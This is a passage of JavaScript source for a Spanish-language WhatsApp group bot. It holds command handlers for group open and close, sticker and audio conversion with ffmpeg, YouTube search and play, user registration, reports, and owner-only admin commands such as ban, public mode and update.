text: `𝐆𝐫𝐮𝐩𝐨 𝐚𝐛𝐢𝐞𝐫𝐭𝐨 𝐩𝐨𝐫 𝐞𝐥 𝐚𝐝𝐦𝐢𝐧𝐢𝐬𝐭𝐫𝐚𝐝𝐨𝐫 @${sender.split("@")[0]}`,
contextInfo: { mentionedJid: [sender] }
}
inky.groupSettingChange (from, GroupSettingChange.messageSend, false)
inky.sendMessage(from, open, text, {quoted: sendFakeStatus, sendEphemeral: true})
break

case 'closegc':
if (!isUser) return reply(mess.only.reg)
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admins)
if (!isBotAdmin) return reply(mess.only.botadmin)
var nomor = mek.participant
var close = {
text: `𝐆𝐫𝐮𝐩𝐨 𝐜𝐞𝐫𝐫𝐚𝐝𝐨 𝐩𝐨𝐫 𝐞𝐥 𝐚𝐝𝐦𝐢𝐧𝐢𝐬𝐭𝐫𝐚𝐝𝐨𝐫 @${nomor.split("@s.whatsapp.net")[0]}`,
contextInfo: { mentionedJid: [nomor] }
}
inky.groupSettingChange (from, GroupSettingChange.messageSend, true);
inky.sendMessage(from, close, text, {quoted: sendFakeStatus, sendEphemeral: true})
break

// Seccion convercion

case 's':
case 'sticker':
if (!isUser) return reply(mess.only.reg)
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
var media = await inky.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.webp')
await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply('𝐇𝐮𝐛𝐨 𝐮𝐧 𝐞𝐫𝐫𝐨𝐫 𝐚𝐥 𝐜𝐨𝐧𝐯𝐞𝐫𝐭𝐢𝐫 𝐬𝐮 𝐢𝐦𝐚𝐠𝐞𝐧 𝐚 𝐬𝐭𝐢𝐜𝐤𝐞𝐫')
})
.on('end', function () {
exec(`webpmux -set exif ${addMetadata(pack, author)} ${ran} -o ${ran}`, async (error) => {
if (error) {
fs.unlinkSync(media)	
fs.unlinkSync(ran)
}
inky.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek, sendEphemeral: true})
fs.unlinkSync(media)	
fs.unlinkSync(ran)	
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
var encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
var media = await inky.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.webp')
reply(mess.only.pegatina)
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`Hubo un error al convertir ${tipe} a sticker`)
})
.on('end', function () {
exec(`webpmux -set exif ${addMetadata(pack, author)} ${ran} -o ${ran}`, async (error) => {
if (error) {
fs.unlinkSync(media)	
fs.unlinkSync(ran)
}
inky.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek, sendEphemeral: true})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else {
reply(`𝐄𝐧𝐯𝐢𝐞 𝐮𝐧𝐚 𝐢𝐦𝐚𝐠𝐞𝐧 𝐜𝐨𝐧 𝐞𝐥 𝐜𝐨𝐦𝐚𝐧𝐝𝐨 ${prefix + command} 𝐨 𝐞𝐭𝐢𝐪𝐮𝐞𝐭𝐚 𝐚 𝐮𝐧𝐚 𝐢𝐦𝐚𝐠𝐞𝐧 𝐪𝐮𝐞 𝐲𝐚 𝐬𝐞 𝐡𝐚𝐲𝐚 𝐞𝐧𝐯𝐢𝐚𝐝𝐨`)
}
break

case 'robar':
if (!isUser) return reply(mess.only.reg)
if (!isQuotedSticker) return reply(`𝐄𝐭𝐢𝐪𝐮𝐞𝐭𝐚 𝐮𝐧 𝐬𝐭𝐢𝐜𝐤𝐞𝐫 𝐜𝐨𝐧 𝐞𝐥 𝐜𝐨𝐦𝐚𝐧𝐝𝐨: *${prefix + command} 𝐧𝐨𝐦𝐛𝐫𝐞|𝐚𝐮𝐭𝐨𝐫*`)
const encmediats = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var kls = q
var pack = kls.split("|")[0];
var author2 = kls.split("|")[1];
if (!q) return reply('*Y el nombre de autor y paquete?*')
if (!pack) return reply(`𝐄𝐭𝐢𝐪𝐮𝐞𝐭𝐚 𝐮𝐧 𝐬𝐭𝐢𝐜𝐤𝐞𝐫 𝐜𝐨𝐧 𝐞𝐥 𝐜𝐨𝐦𝐚𝐧𝐝𝐨: *${prefix + command} 𝐧𝐨𝐦𝐛𝐫𝐞|𝐚𝐮𝐭𝐨𝐫*`)
if (!author2) return reply(`𝐄𝐭𝐢𝐪𝐮𝐞𝐭𝐚 𝐮𝐧 𝐬𝐭𝐢𝐜𝐤𝐞𝐫 𝐜𝐨𝐧 𝐞𝐥 𝐜𝐨𝐦𝐚𝐧𝐝𝐨: *${prefix + command} 𝐧𝐨𝐦𝐛𝐫𝐞|𝐚𝐮𝐭𝐨𝐫*`)
const dlfile = await inky.downloadMediaMessage(encmediats)
reply(mess.wait)
const bas64 = `data:image/jpeg;base64,${dlfile.toString('base64')}`
var mantap = await convertSticker(bas64, `${author2}`, `${pack}`)
var imageBuffer = new Buffer.from(mantap, 'base64');
inky.sendMessage(from, imageBuffer, sticker, {quoted: mek, sendEphemeral: true})
break

case 'tomp3':
if (!isUser) return reply(mess.only.reg)
if (!isQuotedVideo) return reply(`𝐄𝐭𝐢𝐪𝐮𝐞𝐭𝐞 𝐚 𝐮𝐧 𝐯𝐢𝐝𝐞𝐨 𝐜𝐨𝐧 𝐞𝐥 𝐜𝐨𝐦𝐚𝐧𝐝𝐨 ${prefix + command}`)
reply(mess.wait)
var encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var media = await inky.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply('𝐇𝐮𝐛𝐨 𝐮𝐧 𝐞𝐫𝐫𝐨𝐫 𝐚𝐥 𝐜𝐨𝐧𝐯𝐞𝐫𝐭𝐢𝐫 𝐞𝐥 𝐦𝐩𝟒 𝐚 𝐦𝐩𝟑')
buffer = fs.readFileSync(ran)
inky.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: fakeStatus, sendEphemeral: true})
fs.unlinkSync(ran)
})
break

// Seccion Internet

case 'ytsearch':
if (!isUser) return reply(mess.only.reg)
if (!q) return reply(`𝐄𝐬𝐜𝐫𝐢𝐛𝐚 𝐮𝐧𝐚 𝐥𝐨 𝐪𝐮𝐞 𝐝𝐞𝐬𝐞𝐞 𝐛𝐮𝐬𝐜𝐚𝐫\𝐧𝐄𝐣𝐞𝐦𝐩𝐥𝐨: ${prefix + command}𝐒𝐡𝐢𝐧𝐠𝐚𝐭𝐬𝐮 𝐰𝐚 𝐤𝐢𝐦𝐢 𝐧𝐨 𝐮𝐬𝐨`)
resvi = await yts(q)
searchyt = `${botName} 𝐘𝐨𝐮𝐭𝐮𝐛𝐞 𝐒𝐞𝐚𝐫𝐜𝐡\n`
for (let i of resvi.all) {
searchyt += `
➼ *Titulo:* ${i.title}
➼ *ID Video:* ${i.videoId}
➼ *Vistas:* ${i.views}
➼ *Subido:* ${i.ago}
➼ *Duració:* ${i.timestamp}
➼ *Canal:* ${i.author.name}
➼ *Link del canal:* ${i.author.url}
➼ *Link del video:* ${i.url}
`
}
var inkyts = searchyt.trim()
var fakeStatusYts = { key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"imageMessage": {
"mimetype": "image/jpeg",
"caption": `👾${botName} | 𝐓𝐡𝐢𝐬𝐈𝐬𝐈𝐧𝐤𝐲👾\n${q}`,
'jpegThumbnail': fs.readFileSync('./media/image/reply.jpg')}}
}
sendFileFromUrl(resvi.all[0].image, image, {quoted: fakeStatusYts, caption: inkyts, sendEphemeral: true})
break

case 'play':
if (!isUser) return reply(mess.only.reg)
teks = args.join(' ')
if (!teks.endsWith("-doc")){
res1 = await yts(q).catch(e => {
reply('𝐍𝐨 𝐬𝐞 𝐞𝐧𝐜𝐨𝐧𝐭𝐫𝐨 𝐬𝐮 𝐚𝐫𝐜𝐡𝐢𝐯𝐨')
})
let thumbInfo = `
${botName} Youtube Music

➼ *Titulo:* ${res1.all[0].title}
➼ *Duracion:* ${res1.all[0].timestamp}
➼ *Canal:* ${res1.all[0].author.name}
➼ *Link:* ${res1.all[0].url}

Espere, su audio esta siendo enviado...
`
var fakeStatusMusic = { key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"imageMessage": {
"mimetype": "image/jpeg",
"caption": `👾${botName} | 𝐓𝐡𝐢𝐬𝐈𝐬𝐈𝐧𝐤𝐲👾\n${res1.all[0].title}`,
'jpegThumbnail': fs.readFileSync('./media/image/reply.jpg')}}
}
sendFileFromUrl(res1.all[0].image, image, {quoted: fakeStatusMusic, sendEphemeral: true, caption: thumbInfo})
res1 = await y2mate(res1.all[0].url).catch(e => {
pr21 = getJson(`https://api.zeks.xyz/api/ytmp3?apikey=hamilton20&url=${res1.all[0].url}`)
reply(`𝐇𝐮𝐛𝐨 𝐮𝐧 𝐞𝐫𝐫𝐨𝐫 𝐚𝐥 𝐞𝐧𝐯𝐢𝐚𝐫 𝐬𝐮 𝐚𝐫𝐜𝐡𝐢𝐯𝐨`)
sendFileFromUrl(pr21.result.url_audio, audio, {quoted: fakeStatusMusic, sendEphemeral: true, mimetype: 'audio/mp4', filename: res1[0].output})
sendFileFromUrl(pr21.result.url_audio, audio, {quoted: fakeStatusMusic, sendEphemeral: true, mimetype: 'audio/mp4', filename: res1[0].output})
})
sendFileFromUrl(res1[0].link, audio, {quoted: fakeStatusMusic, sendEphemeral: true, mimetype: 'audio/mp4', filename: res1[0].output})
sendFileFromUrl(res1[0].link, audio, {quoted: fakeStatusMusic, sendEphemeral: true, mimetype: 'audio/mp4', ptt: true, filename: res1[0].output})
}
break

// Otros

case 'register':
case 'reg':
case 'registrar':
if (isUser) return reply(`𝐔𝐬𝐭𝐞𝐝 𝐲𝐚 𝐞𝐬𝐭𝐚 𝐫𝐞𝐠𝐢𝐬𝐭𝐫𝐚𝐝𝐨 𝐞𝐧 ${botName}`)
user.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(user))
inky.sendMessage(from, `𝐑𝐞𝐠𝐢𝐬𝐭𝐫𝐚𝐝𝐨 𝐞𝐱𝐢𝐭𝐨𝐬𝐚𝐦𝐞𝐧𝐭𝐞

➼ *𝐍𝐨𝐦𝐛𝐫𝐞:* ${pushname}
➼ *𝐖𝐚𝐦𝐞*: wa.me/${sender.split("@")[0]}
➼ *𝐓𝐚𝐠:* @${sender.split("@s.whatsapp.net")[0]}

*𝐓𝐨𝐭𝐚𝐥 𝐝𝐞 𝐮𝐬𝐮𝐚𝐫𝐢𝐨𝐬:* ${user.length}`, text, {quoted: fakeStatus, sendEphemeral: true})
break

case 'owner':
case 'creator':
case 'creador':
case 'inky':
if (!isUser) return reply(mess.only.reg)
reply(`𝐆𝐫𝐚𝐜𝐢𝐚𝐬 𝐩𝐨𝐫 𝐮𝐭𝐢𝐥𝐢𝐳𝐚𝐫 𝐚 ${botName}, 𝐀𝐛𝐚𝐣𝐨 𝐞𝐬𝐭𝐚 𝐞𝐥 𝐧𝐮𝐦𝐞𝐫𝐨 𝐝𝐞𝐥 𝐜𝐫𝐞𝐚𝐝𝐨𝐫 𝐝𝐞 𝐥𝐚𝐬 𝐛𝐚𝐬𝐞 𝐝𝐞 𝐝𝐚𝐭𝐨𝐬 𝐝𝐞𝐥 𝐛𝐨𝐭, 𝐧𝐨 𝐦𝐨𝐥𝐞𝐬𝐭𝐚𝐫 :D`)
await sendContact(from, '595995660558', "🖤𝐈𝐧𝐤𝐲🖤")
break

case 'report':
if (!isUser) return reply(mess.only.reg)
if (!q) return reply(`𝐄𝐣𝐞𝐦𝐩𝐥𝐨:\n${prefix}𝐫𝐞𝐩𝐨𝐫𝐭 𝐄𝐥 𝐜𝐨𝐦𝐚𝐧𝐝𝐨 ${prefix}𝐬𝐭𝐢𝐜𝐤𝐞𝐫 𝐧𝐨 𝐚𝐧𝐝𝐚`)
var numerorepo = mek.participant
report = `𝐑𝐞𝐩𝐨𝐫𝐭𝐞

➼ 𝐍𝐨𝐦𝐛𝐫𝐞: ${pushname}
➼ 𝐓𝐚𝐠: @${sender.split("@s.whatsapp.net")[0]}
➼ 𝐍𝐮𝐦𝐞𝐫𝐨: ${sender.split("@s.whatsapp.net")[0]}

𝐀𝐬𝐮𝐧𝐭𝐨:
${q}`
var options = { 
text: report, 
contextInfo: {
mentionedJid: [sender]
},
}
var reportFakeStatus = { key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"imageMessage": {
"mimetype": "image/jpeg",
"caption": `👾${botName} | 𝐓𝐡𝐢𝐬𝐈𝐬𝐈𝐧𝐤𝐲👾\n${pushname} | ${groupName}`,
'jpegThumbnail': fs.readFileSync('./media/image/reply.jpg')}}
}
inky.sendMessage(`${botGroup}`, options, MessageType.text, {quoted: reportFakeStatus, sendEphemeral: true})
inky.sendMessage(`${botGroup}`, `𝐏𝐚𝐫𝐚 𝐫𝐞𝐬𝐩𝐨𝐧𝐝𝐞𝐫 𝐮𝐬𝐞:\n\n${prefix}𝐫𝐞𝐩𝐥𝐲 ${sender.split("@s.whatsapp.net")[0]}|𝐓𝐞𝐱𝐭𝐨`, MessageType.text, {quoted: reportFakeStatus, sendEphemeral: true})
reply(`𝐒𝐮 𝐫𝐞𝐩𝐨𝐫𝐭𝐞 𝐡𝐚 𝐬𝐢𝐝𝐨 𝐞𝐧𝐯𝐢𝐚𝐝𝐨 𝐚 𝐥𝐚 𝐚𝐝𝐦𝐢𝐧𝐢𝐬𝐭𝐫𝐚𝐜𝐢𝐨𝐧 𝐝𝐞 ${botName}`)
break

// Seccion Owner

case 'update':
if (!isUser) return reply(mess.only.reg)
if (!isOwner) return reply(mess.only.owner)
exec(`bash update.sh`, (err, stdout) => {
if (err) return reply(err)
if (stdout) reply(`${stdout}`)
})
break

case 'reply':
if (!isUser) return reply(mess.only.reg)
if (!isOwner) return reply(mess.only.owner)
var replyFakeStatus = { key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"imageMessage": {
"mimetype": "image/jpeg",
"caption": `👾${botName} | 𝐓𝐡𝐢𝐬𝐈𝐬𝐈𝐧𝐤𝐲👾\n➼ 𝐒𝐭𝐚𝐟𝐟: ${pushname}`,
'jpegThumbnail': fs.readFileSync('./media/image/reply.jpg')}}
}
var rp = q
var numero = rp.split("|")[0];
var texto = rp.split("|")[1];
inky.sendMessage(numero+'@s.whatsapp.net', texto, text, {quoted: replyFakeStatus, sendEphemeral: true})
reply(`𝐒𝐮 𝐦𝐞𝐧𝐬𝐚𝐣𝐞\𝐧${texto}\n𝐇𝐚 𝐬𝐢𝐝𝐨 𝐞𝐧𝐯𝐢𝐚𝐝𝐨 𝐞𝐱𝐢𝐭𝐨𝐬𝐚𝐦𝐞𝐧𝐭𝐞 𝐚 ${numero}`)
break

case 'public':
if (!isUser) return reply(mess.only.reg)
if (!isOwner) return await reply(mess.only.owner)
if (public) return await reply('𝐄𝐥 𝐦𝐨𝐝𝐨 𝐩𝐮𝐛𝐥𝐢𝐜𝐨 𝐲𝐚 𝐞𝐬𝐭𝐚𝐛𝐚 𝐚𝐜𝐭𝐢𝐯𝐨')
config["public"] = true
public = true
fs.writeFileSync("./lib/config.json", JSON.stringify(config, null, 4))
await sendFakeStatus(from, "𝐒𝐞 𝐡𝐚 𝐚𝐜𝐭𝐢𝐯𝐚𝐝𝐨 𝐦𝐨𝐝𝐨 𝐩𝐮𝐛𝐥𝐢𝐜𝐨", "Public : true")
break

case 'self':
if (!isUser) return reply(mess.only.reg)
if (!isOwner) return await reply(mess.only.owner)
if (!public) return await reply('𝐄𝐥 𝐦𝐨𝐝𝐨 𝐩𝐫𝐢𝐯𝐚𝐝𝐨 𝐲𝐚 𝐞𝐬𝐭𝐚𝐛𝐚 𝐚𝐜𝐭𝐢𝐯𝐨')
config["public"] = false
public = false
fs.writeFileSync("./lib/config.json", JSON.stringify(config, null, 4))
await sendFakeStatus(from, "𝐒𝐞 𝐡𝐚 𝐚𝐜𝐭𝐢𝐯𝐚𝐝𝐨 𝐦𝐨𝐝𝐨 𝐩𝐫𝐢𝐯𝐚𝐝𝐨", "Self : true")
break

case 'ban':
if (!isUser) return reply(mess.only.reg)
if (!isOwner) return reply(mess.only.owner)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '*\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
ban.push(`${mentioned}`)
fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
susp = `𝐁𝐚𝐧𝐞𝐚𝐝𝐨

➼ *𝐒𝐭𝐚𝐟𝐟:* ${pushname}
➼ *𝐔𝐬𝐮𝐚𝐫𝐢𝐨:* @${mentioned[0].split('@')[0]}`
mentions(`${susp}`, mentioned, true)   
break
case 'unban':
if (!isUser) return reply(mess.only.reg)
if (!isOwner) return reply(mess.only.owner)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '*\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
ban.splice(`${mentioned}`)
fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
susp = `𝐔𝐧𝐁𝐚𝐧𝐞𝐚𝐝𝐨

➼ *𝐒𝐭𝐚𝐟𝐟:* ${pushname}
➼ *𝐔𝐬𝐮𝐚𝐫𝐢𝐨:* @${mentioned[0].split('@')[0]}`
mentions(`${susp}`, mentioned, true)   
break

case 'listgroup':
const inkylg = inky.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`
════════✪〘 𝐆𝐫𝐮𝐩𝐨 〙✪════════════
➼ 𝐈𝐝: ${v.jid}*
➼ 𝐄𝐬𝐭𝐚𝐝𝐨: ${v.read_only ? 'No agregado' : 'Agregado'}
════════✪〘 ${botName} 〙✪════════`).join`\n\n`
reply('𝐋𝐢𝐬𝐭𝐚 𝐝𝐞 𝐠𝐫𝐮𝐩𝐨𝐬:\n\n' + inkylg)
break

}

} catch (e) {
const emror = String(e)
if (emror.includes('this.isZero')){ 
return
}
console.log(e)
inky.sendMessage(`${botGroup}`, `${e}`, MessageType.text, {quoted: mek})
}
})
